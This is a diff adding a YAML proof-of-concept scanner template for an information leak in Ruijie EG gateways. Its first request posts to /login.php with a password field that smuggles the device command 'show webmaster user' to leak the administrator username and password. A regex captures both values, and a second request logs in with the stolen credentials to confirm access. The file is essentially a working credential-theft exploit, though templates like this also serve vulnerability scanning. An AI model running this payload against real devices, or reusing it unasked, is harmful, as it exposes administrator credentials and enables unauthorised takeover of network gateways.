@@ -1,0 +1,24 @@
+name: poc-yaml-ruijie-eg-info-leak
+rules:
+  - method: POST
+    path: /login.php
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      username=admin&password=admin?show+webmaster+user
+    expression: "true"
+    search: |
+      {"data":".*?(?P<username>\w+)\s?(?P<password>\w+)","status":1}
+  - method: POST
+    path: /login.php
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      username={{username}}&password={{password}}
+    expression: |
+      response.status == 200 && response.body.bcontains(b"{\"data\":\"0\",\"status\":1}")
+detail:
+  author: Search?=Null
+  description: "Ruijie EG网关信息泄漏"
+  links:
+    - https://mp.weixin.qq.com/s/jgNyTHSqWA5twyk5tfSQUQ
